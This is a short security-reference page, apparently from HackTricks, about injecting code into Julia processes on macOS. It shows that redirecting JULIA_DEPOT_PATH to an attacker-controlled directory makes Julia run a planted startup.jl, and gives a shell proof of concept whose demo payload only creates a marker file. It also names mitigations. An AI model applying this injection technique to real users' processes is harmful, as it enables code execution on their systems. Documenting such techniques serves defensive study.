---
title: "macOS Julia Applications Injection"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-julia-applications-injection.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: misc
---

## `JULIA_DEPOT_PATH` and `startup.jl`

`JULIA_DEPOT_PATH` and `startup.jl`
Julia normally executes `config/startup.jl` from its first depot at startup. `JULIA_DEPOT_PATH` controls the depot list, so pointing it to an attacker-readable tree redirects the automatically loaded startup file.[\[1\]](#references)[\[2\]](#references)

```
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl
# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```
The trailing separator is useful when the victim still needs its normal packages. `julia --startup-file=no` disables this startup file. Clear the variable before launch because it also controls package registries, environments, caches, and code-loading locations.

## References
